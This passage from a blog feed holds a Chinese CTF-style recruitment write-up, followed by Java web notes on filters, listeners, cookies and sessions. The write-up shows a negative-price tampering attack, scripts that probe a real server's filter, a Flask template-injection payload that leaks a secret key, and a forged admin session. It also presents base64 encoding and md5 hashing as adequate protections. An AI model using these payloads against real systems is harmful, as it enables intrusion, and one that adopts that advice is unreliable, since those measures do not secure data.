SQL注入防御</h4><p>对于所有和 SQL 数据库交互的命令，都保证拼接参数可控，把用户输入的 username 和 mail 经过 base64 编码处理，password 经过 md5 加密处理，之后再拼接成 SQL 语句执行，防止 SQL 注入。</p><h4 id="3-用户密码保护"><a href="#3-用户密码保护" class="headerlink" title="3. 用户密码保护"></a>3. 用户密码保护</h4><p>虽说这个不是防御漏洞，但是将用户的密码使用 md5 加密保存可以大大增加用户数据的隐私性，即使数据库被盗，用户的密码也不会被直接利用。</p><h4 id="4-文件包含漏洞防御"><a href="#4-文件包含漏洞防御" class="headerlink" title="4. 文件包含漏洞防御"></a>4. 文件包含漏洞防御</h4><p>直接禁用 php  phar zip 协议，然后使用自己定义的协议 master 来进行文件上传和搜索。仅限能够完成自己需要的用途。对于涉及到 include，file_put_contents，file_get_contents等，都进行了关键词过滤。比如 index.php 中的正则限制只能输入英文字母，几乎所有地方都用数据库或者程序生成的数据而不是用户输入。</p><h4 id="5-XSS漏洞防御"><a href="#5-XSS漏洞防御" class="headerlink" title="5. XSS漏洞防御"></a>5. XSS漏洞防御</h4><p>在展示由用户自主上传的信息：用户名和邮箱地址，的时候，使用 htmlspecialchars() 进行了 html 标志词过滤并限制长度，防止用户上传恶意的 XSS 代码，在一些界面输出时激活。</p><h4 id="6-无权限操作漏洞防御"><a href="#6-无权限操作漏洞防御" class="headerlink" title="6. 无权限操作漏洞防御"></a>6. 无权限操作漏洞防御</h4><p>在所有需要账号操作的页面都使用Session进行登录验证，只有登录成功才可以进行相应的操作。</p><h3 id="0x03-漏洞挖掘"><a href="#0x03-漏洞挖掘" class="headerlink" title="0x03 漏洞挖掘"></a>0x03 漏洞挖掘</h3><h3 id="1-反向加钱漏洞"><a href="#1-反向加钱漏洞" class="headerlink" title="1. 反向加钱漏洞"></a>1. 反向加钱漏洞</h3><p>在 info.php 中，使用了以下代码来购买商品：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;price&quot;</span> <span class="attr">value</span>=<span class="string">&quot;%price%&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$price</span> = intval(<span class="variable">$_POST</span>[<span class="string">&#x27;price&#x27;</span>]);</span><br><span class="line"><span class="variable">$point</span> -= <span class="variable">$price</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;update sshop.users set point=&quot;</span>.<span class="variable">$point</span>.<span class="string">&quot; where username=&#x27;&quot;</span>.base64_encode(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]).<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为使用POST来提交价格，而且这个POST是用户可控的，那么就可以通过修改 price 的值实现 0元购或者反向加钱。</p><p>首先登录打开购买界面，然后启动 BurpSuite 拦截购买请求的包，将 POST 提交的数据 price 修改成负数：</p><p><img src="https://xorex.space/image/214.jpg" alt="image.png"></p><p>然后提交数据包，就可以看到自己的积分瞬间变多了。</p><p><img src="https://xorex.space/image/215.jpg" alt="image.png"></p><p>另外吐槽一下这个前端提高积分精度，直接拼接 ‘.0’ 可还行。</p><hr><p><strong>防御方法：</strong>在计算金钱的时候，用 <code>$_SESSION[&#39;goodid&#39;];</code>  保存的商品编号作为索引在数据库中查询价格，保证数据的可控性。</p><h4 id="2-敏感信息泄露"><a href="#2-敏感信息泄露" class="headerlink" title="2. 敏感信息泄露"></a>2. 敏感信息泄露</h4><p>存在文件 phpinfo.php 执行了 phpinfo() 代码，访问此页面会暴露 php 的各种信息，比如被禁用的些伪协议，php版本信息，预加载文件，文件路径，开启的选项，等。这些信息可以为黑客对网站渗透提供了便利，不利于网站的安全，建议删除。</p><h4 id="3-任意文件读取漏洞"><a href="#3-任意文件读取漏洞" class="headerlink" title="3. 任意文件读取漏洞"></a>3. 任意文件读取漏洞</h4><p>当然由于我实力过菜，还没完整的找出来如何实现任意文件的读取漏洞。</p><p>基本的想法还是有的，实现任意文件读取漏洞就必须要用到 index.php ，而访问这个页面的前提就是覆盖掉 .htaccess 文件。可以通过上传头像的页面，上传一个空的 .htaccess 文件，控制路径到根路径即可。但是不会绕过控制路径，所以没法实现。</p><p>查了各种资料，看了很多任意文件读取漏洞，搜了各种绕过姿势……还是没有结果</p><p>（我的搜索引擎利用能力还是太弱了）</p><p>说一下发现的一些细节吧：</p><ul><li><strong>config.php</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="variable">$path</span>.<span class="variable">$filename</span>,<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>这里的 $filename 可控，尝试利用文件名修改路径，但是无法成功。</p><ul><li><strong>shop.php</strong></li></ul><p>里面有一个 page 参数可以在 url 中控制，然后传进去 <code>&lt;?php echo $page+1;?&gt;</code>  但是传进去的是一个字符串，在和数字运算的时候会默认变成 0 ，所以暂时还不知道利用的方法。  </p><blockquote><p>任务一大概就这样了……</p></blockquote><h2 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h2><blockquote><p>任务一做的真的是太稀烂了，剩下最后两天做一下任务二来补救一下。</p></blockquote><p>首先搜了搜文章了解了一下 flask 框架的知识，大概知道了产生 SSTI 的原理，然后对着网站的接口试了一下，在 Your Name 这里尝试出来了存在 SSTI 漏洞，然后使用脚本验证关键词过滤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL=<span class="string">&quot;http://106.54.75.217:1099/index&quot;</span></span><br><span class="line">Names=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    Names.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Name <span class="keyword">in</span> Names:</span><br><span class="line">    Data=&#123;<span class="string">&#x27;username&#x27;</span>:Name&#125;</span><br><span class="line">    Res=requests.post(url=URL,data=Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;banned&#x27;</span> <span class="keyword">in</span> Res.text:</span><br><span class="line">        print(Name,<span class="built_in">ord</span>(Name))</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>确定了单个字符 <code>+</code> <code>[</code> <code>\</code> <code>]</code> <code>&quot;</code> <code>#</code> <code>%</code> <code>&amp;</code> <code> </code> <code>^</code> <code>|</code> 都被过滤，然后使用脚本确定被过滤的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Names=<span class="built_in">dir</span>(Person)</span><br><span class="line">URL=<span class="string">&quot;http://106.54.75.217:1099/index&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> Name <span class="keyword">in</span> Names:</span><br><span class="line">    Data=&#123;<span class="string">&#x27;username&#x27;</span>:Name&#125;</span><br><span class="line">    Res=requests.post(url=URL,data=Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;banned&#x27;</span> <span class="keyword">in</span> Res.text:</span><br><span class="line">        print(<span class="string">&quot;Banned:&quot;</span>,Name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;Accpeded:&quot;</span>,Name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后可以确定地数据目前可以使用的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Accpeded: __le__</span><br><span class="line">Accpeded: __lt__</span><br><span class="line">Accpeded: __module__</span><br><span class="line">Accpeded: __ne__</span><br><span class="line">Accpeded: __new__</span><br><span class="line">Accpeded: __reduce__</span><br><span class="line">Accpeded: __reduce_ex__</span><br><span class="line">Accpeded: __repr__</span><br><span class="line">Accpeded: __delattr__</span><br><span class="line">Accpeded: __dir__</span><br><span class="line">Accpeded: __doc__</span><br><span class="line">Accpeded: __eq__</span><br><span class="line">Accpeded: __ge__</span><br><span class="line">Accpeded: __gt__</span><br><span class="line">Accpeded: __hash__</span><br><span class="line">Accpeded: __sizeof__</span><br><span class="line">Accpeded: __str__</span><br><span class="line">Accpeded: __weakref__</span><br></pre></td></tr></table></figure><p>以及被禁止的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Banned: __class__</span><br><span class="line">Banned: __dict__</span><br><span class="line">Banned: __format__</span><br><span class="line">Banned: __getattribute__</span><br><span class="line">Banned: __init__</span><br><span class="line">Banned: __init_subclass__</span><br><span class="line">Banned: __setattr__</span><br><span class="line">Banned: __subclasshook__</span><br></pre></td></tr></table></figure><p><del>然后就不知道怎么办</del></p><p>大概查了很多很多篇文章，在攻防世界照着 WriteUp 做了一道 SSTI 的题目之后，才（可能）弄明白做 SSTI 的思路，以及 SSTI 过程的语句含义。（啥都不知道真的是太痛苦了）</p><p>但是这个过滤了一堆东西，尤其是过滤 class 搞得刚刚接触 SSTI 的我不知所措，疯狂搜索可以代替 class 的方式，因为 <code>+</code> <code>[]</code> 也被过滤了，而且我对 SSTI 还是一知半解，所以也没有搜到什么有用的方法。</p><p>经过了各种漫无目的的乱试，抓包，发现了提示 <code>&lt;!--you are a guest--&gt;</code>  ，原来不收我的原因是因为我是 guest ，还给我传了一个 Cookie ，应该是用来验证登陆的，所以猜测可能需要用模板注入偷管理员 Cookie 出来，或者找到管理员的名字。（ 我还傻傻的去尝试了 admin/syclover/F4de/Longlone 去登录 ）</p><p>网上找了偷 Cookie 的语句 handler.settings 发现 set 被禁用了，一时不知道如何是好，只能漫无目的的查资料，在这里卡了很久很久。终于在一篇伪造 session 越权的文章里面知道了 secret_key 。然后找到了目标，开始各种搜索 secret_key 的文章，明白了 secret_key 的作用。想到了抓包的时候发现的 Cookie 中的 session ，大概明白了需要搞到的东西是 secret_key 。</p><p>然后在网上搜索 SSTI 获得 secret_key 的方法，然后找了一个不需要 class 的，然后搜了 globals 不需要中括号的访问方式，搞出来一个我都不知道行不行的 payload: <code>get_flashed_messages.__globals__.current_app.config</code>  粘到了 Your Name 框框里面，好家伙，直接成功了，拿到了 secret_key ： <code>&#39;E81SRrCaLmjVxJkzlugcGdWX&#39;</code></p><p>按照网上搜索，看到了 HCTF2018 admin 看样子好像一模一样。然后就是搜索用来解码的脚本，粘贴了一个运行之后 print 输出不回显，本地写了一个 print(“SYC”) 的脚本在 cmd 运行也没有输出。就去隔壁借用77的电脑跑脚本，这个时候他旁边的 fever_king 告诉我 python 有一个叫 flask-unsign 的模板，让我去试试。</p><p>pip 下完之后开始解密 Cookie ，有两个参数，一个是 username 一个是 uuid，果然是 guest 啊。改了 username 为 admin 之后再次访问页面，发现还是说我是 guest ，奇怪。</p><p>重新试了两次还是这样，就改了 uuid 为 1，再次上传，发现成功了，拿到了 Flag ：SYC{This_is_F1rst_f1ag_AND_You_are_re11y_g00d}</p><p>做这题真的是太折磨人了，尤其是漫无目的的搜索，哭.jpg</p><p>本来想做一下第二题的，但是时间肯定不够了，JUNCTION 已经躺平了一天半来做二面任务了，比赛最后一天也不帮忙不太好，就去给无名侠端茶倒水造数据了。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><ul><li><p>感谢浪爷中途的关心和鼓励，不然报告里就可能就没有任务二了。</p></li><li><p>三叶草的师傅们辛苦了，感谢你们对萌新们的付出！</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;是该正视自己的过去了，关于自己在 Syclover 招新的第二次面试报告，也该让它作为自己博客文章的一员了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;任务一&quot;&gt;&lt;a href=&quot;#任务一&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="信息安全" scheme="https://xorex.space/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="syclover" scheme="https://xorex.space/tags/syclover/"/>
    
  </entry>
  
  <entry>
    <title>Listener 和 Filter 学习笔记</title>
    <link href="https://xorex.space/2021/04/08/c99260ec0725/"/>
    <id>https://xorex.space/2021/04/08/c99260ec0725/</id>
    <published>2021-04-08T11:39:53.000Z</published>
    <updated>2021-04-08T14:01:55.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Listener-监听器"><a href="#Listener-监听器" class="headerlink" title="Listener 监听器"></a>Listener 监听器</h2><p>Listener 监听器是 Java EE 的三大组件之一。Java Web 的三大组件分别是 Servlet 程序，Filter 过滤器，Listener 监听器。Listener 是一个接口，只要实现这个接口，就获得了一个监听器</p><h3 id="ServletContextListener-监听-ServletContext"><a href="#ServletContextListener-监听-ServletContext" class="headerlink" title="ServletContextListener 监听 ServletContext"></a>ServletContextListener 监听 ServletContext</h3><p>首先编写一个类去实现 ServletContextListener 接口，编写监听到某个事件之后的需要执行的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Listener</span> <span class="keyword">implements</span> <span class="title">ServletContextListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextInitialized</span><span class="params">(ServletContextEvent sce)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServletContext is initialized!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">contextDestroyed</span><span class="params">(ServletContextEvent sce)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ServletContext is destroyed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再 web.xml 中像配置 Servlet 一样去配置一个 Listener：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>space.xorex.BookStore.Listener.Listener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后当我们启动 Tomcat 成功之后，就可以捕捉到了 ServletContext 的初始化事件，然后交给 contextInitialized() 方法去处理。</p><h2 id="Filter-过滤器"><a href="#Filter-过滤器" class="headerlink" title="Filter 过滤器"></a>Filter 过滤器</h2><h3 id="Filter-概述"><a href="#Filter-概述" class="headerlink" title="Filter 概述"></a>Filter 概述</h3><p>对于非 Servlet 的资源请求，对非法请求进行拒绝只能依靠 Filter 来实现。Filter 过滤器的作用就是对请求进行过滤，所有请求在被处理之前，都会被交给 Filter。Filter 有权决定当前请求是否被继续传递下去（下一个 Filter 或者目标资源）。</p><h3 id="Filter-建立"><a href="#Filter-建立" class="headerlink" title="Filter 建立"></a>Filter 建立</h3><p>首先需要一个 Java 程序来对请求进行过滤处理，这里需要继承 Filter 接口，实现里面定义的几个方法，其中最重要的就是 doFilter() 方法，在访问目标资源之前会执行这个方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">    HttpServletRequest req=(HttpServletRequest)servletRequest;</span><br><span class="line">    String userName=(String)(req.getSession().getAttribute(<span class="string">&quot;userName&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span>(userName==<span class="keyword">null</span>) &#123;</span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/index.jsp&quot;</span>).forward(servletRequest, servletResponse); <span class="comment">//没有登录</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(userName.equals(<span class="string">&quot;Xorex&quot;</span>)) &#123;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse); <span class="comment">//确认权限足够</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;/index.jsp&quot;</span>).forward(servletRequest, servletResponse); <span class="comment">//权限不足</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后需要在 web.xml 文件中加入对 Filter 的一个映射，用来确定在访问那里的资源的时候使用此过滤器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ManagerFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>space.xorex.BookStore.filter.ManagerFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ManagerFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/pages/manager/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span> <span class="comment">&lt;!-- 这里 * 表示任意字符匹配 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后就可以过滤非管理员对 manager 下面资源的访问了。</p><h3 id="Filter-生命周期"><a href="#Filter-生命周期" class="headerlink" title="Filter 生命周期"></a>Filter 生命周期</h3><ol><li><p>首先执行 Filter 的构造方法。</p></li><li><p>然后执行 Filter 的 init() 方法。</p></li><li><p>遇到符合要求的过滤请求的时候，执行 doFilter() 方法。</p></li><li><p>服务器结束的时候执行 destroy() 方法。</p></li></ol><h3 id="Filter-运行过程"><a href="#Filter-运行过程" class="headerlink" title="Filter 运行过程"></a>Filter 运行过程</h3><p><img src="https://xorex.space/image/213.jpg"></p><p>仔细看过上面的图之后，需要注意的是在 chain.doFilter() 执行交给下一个过滤器或者目标资源之后，还会像递归一样回来的，这里可以对资源的响应进行二次确认。还需要注意 FilterChain 的构造方法，在 web.xml 中按照合理的顺序声明 Filter 程序即可。</p><h3 id="FilterConfig-类"><a href="#FilterConfig-类" class="headerlink" title="FilterConfig 类"></a>FilterConfig 类</h3><p>可以直接在 Filter 中使用方法 filterConfig 获取一个 FilterConfig 对象实例，然后用方法 getInitParameter() 来获取在 web.xml 中设置的 Filter 初始化参数 <code>&lt;init-param&gt;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Listener-监听器&quot;&gt;&lt;a href=&quot;#Listener-监听器&quot; class=&quot;headerlink&quot; title=&quot;Listener 监听器&quot;&gt;&lt;/a&gt;Listener 监听器&lt;/h2&gt;&lt;p&gt;Listener 监听器是 Java EE 的三大组件之一。</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Filter" scheme="https://xorex.space/tags/Filter/"/>
    
    <category term="Listener" scheme="https://xorex.space/tags/Listener/"/>
    
  </entry>
  
  <entry>
    <title>Cookie &amp; Session</title>
    <link href="https://xorex.space/2021/04/07/fbc5026f0717/"/>
    <id>https://xorex.space/2021/04/07/fbc5026f0717/</id>
    <published>2021-04-07T09:39:32.000Z</published>
    <updated>2021-04-07T14:36:58.527Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="创建-Cookie"><a href="#创建-Cookie" class="headerlink" title="创建 Cookie"></a>创建 Cookie</h3><p>使用构造方法创建，输入键值对即可，可以同时创建多个 Cookie，然后都输入到响应头中让浏览器保存。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie cookie=<span class="keyword">new</span> Cookie(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Yukino&quot;</span>);</span><br><span class="line">Cookie cookie1=<span class="keyword">new</span> Cookie(<span class="string">&quot;Yuuki&quot;</span>, <span class="string">&quot;Asuna&quot;</span>);</span><br><span class="line">resp.addCookie(cookie);</span><br><span class="line">resp.addCookie(cookie1);</span><br></pre></td></tr></table></figure><h3 id="Cookie-生命周期"><a href="#Cookie-生命周期" class="headerlink" title="Cookie 生命周期"></a>Cookie 生命周期</h3><p>Cookie 的生命周期由 <code>setMaxAge()</code> 来设置，有三种值：</p><ol><li><p>正整数 表示经过这个正整数秒之后，这个 Cookie 过期。</p></li><li><p>-1 表示 Cookie 生命周期为会话级别，关闭浏览器就删除（其实就没写进内存）</p></li><li><p>0 表示立刻删除 Cookie，立刻的意思是字面意思，浏览器接收到响应就删了。</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Cookie[] cookies = req.getCookies();</span><br><span class="line"><span class="keyword">for</span>(Cookie i:cookies) &#123;</span><br><span class="line">    i.setMaxAge(<span class="number">3600</span>); <span class="comment">//一小时后删除</span></span><br><span class="line">    i.setMaxAge(-<span class="number">1</span>); <span class="comment">//关闭浏览器就删除</span></span><br><span class="line">    i.setMaxAge(<span class="number">0</span>) <span class="comment">//立刻删除</span></span><br><span class="line">    resp.addCookie(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改-删除-Cookie"><a href="#修改-删除-Cookie" class="headerlink" title="修改/删除 Cookie"></a>修改/删除 Cookie</h3><p>因为对于浏览器接收到一个 Cookie 之后，会先查看有没有 Name、Path 和 Domain 都一样的 Cookie，如果有，那么就去修改这个 Cookie 的 Value 属性为新接收到的 Cookie 的 Value 值。如果没有，则创建一个新的 Cookie 去保存里面的内容。</p><p>所以对一个 Cookie 进行修改或删除的时候，尽量先获取这个 Cookie，然后设置 Value 或者修改其 age 为 0；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie[] cookies=req.getCookies();</span><br><span class="line">Cookie cookie = WebUtils.findCookie(<span class="string">&quot;Yuuki&quot;</span>, cookies);</span><br><span class="line">cookie.setValue(<span class="string">&quot;Xorex&quot;</span>);</span><br><span class="line">resp.addCookie(cookie);</span><br></pre></td></tr></table></figure><h3 id="Domain-和-Path"><a href="#Domain-和-Path" class="headerlink" title="Domain 和 Path"></a>Domain 和 Path</h3><p>这个属性是定义在怎样的域名和路径下，才会发送 Cookie 给服务器。</p><p>对于一个访问地址： <code>http://xorex.space:8080/BookStore/manager</code> 设定 Cookie 只在访问这里的时候发送：</p><p>Path 设置为：/BookStore/manager</p><p>Domain 设置为：xorex.space</p><p>需要注意的是，这里定义的限制 Cookie 发送指的是只有访问地址为 <code>Domain+Path</code> 的子地址才会发送 Cookie，比如 Path 的子地址：<code>/BookStore/mananger/xorex/index.jsp</code> 和 Domain 的子地址：<code>bookstore.xorex.space</code> 都符合发送 Cookie 的要求，而且这里 Cookie 的限制是<strong>无视</strong>端口号的。</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><h3 id="Session-概述"><a href="#Session-概述" class="headerlink" title="Session 概述"></a>Session 概述</h3><p>Session 指的是一个会话，会话是指一个终端用户与交互系统进行通讯的过程。在 Web 里面就是从开发访问网页执行一定的操作之后最后关闭网页的过程。</p><p>首先服务器里面有一个 Session 池，里面负责存储和生成 Session 对象，当客户端第一次访问服务器的时候，是肯定不会包含带有 Session ID 值的 Cookie 的。那么服务器会把它当作一个会话的开始，为这个客户生成一个 Session 对象，保存到 Session 池中，然后将这个 Session 对象的 Session ID 写入响应头的 Cookie 中，让浏览器保存下来，作为会话的认证标志。</p><p>从一次之后的所有交互中，客户端都会将 Session ID 的 Cookie 放到请求头中，服务器通过这个 Session ID 从 Session 池中找到客户的 Session 对象来进行操作。Session 实例中同样拥有可以设置属性的域，会伴随这 Session 实例可以随意获取。</p><h3 id="Session-创建和获取"><a href="#Session-创建和获取" class="headerlink" title="Session 创建和获取"></a>Session 创建和获取</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpSession session=req.getSession(); <span class="comment">//会自动决定是生成新的 Session 还是去 Session 池中去取。</span></span><br><span class="line">session.getID() <span class="comment">//获取 Session 的 ID 值。</span></span><br></pre></td></tr></table></figure><h3 id="Session-生命周期控制"><a href="#Session-生命周期控制" class="headerlink" title="Session 生命周期控制"></a>Session 生命周期控制</h3><h4 id="Session-销毁"><a href="#Session-销毁" class="headerlink" title="Session 销毁"></a>Session 销毁</h4><p>Session 的销毁有三种情况：</p><ol><li><p>当 Session 硬是熬过了有效期之后，服务器会自动销毁此 Session。</p></li><li><p>当客户关闭浏览器，使保存了 Session ID 的 Cookie 被销毁，从而无法通过 Session ID 从 Session 池中获取客户的 Session 对象，然后等到默认设置的销毁时间之后，服务器再物理销毁 Session 实例。</p></li><li><p>另外一种则是服务器主动销毁，当使用 Session 的 invalidate() 方法之后，会主动将 Session 中的所有用户信息全部清除，然后此 Session 被禁用，和 request 的绑定也会被解除，但是 Session 对象还活着。当再次用 request 获取 Session 的时候，会从 Session 池中取出一个新的出来。</p></li></ol><h4 id="Session-存活时间设置"><a href="#Session-存活时间设置" class="headerlink" title="Session 存活时间设置"></a>Session 存活时间设置</h4><p>Java 中使用 setMaxInactiveInterval() 方法设置 Session 的最大失效间隔时间，单位秒。</p><p>当设置的时间为正数的时候，则等到经过指定时间后，Session 被销毁。</p><p>当设置时间小于等于零的时候，标志此 Session 永远不会被销毁。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.setMaxInactiveInterval(<span class="number">100</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
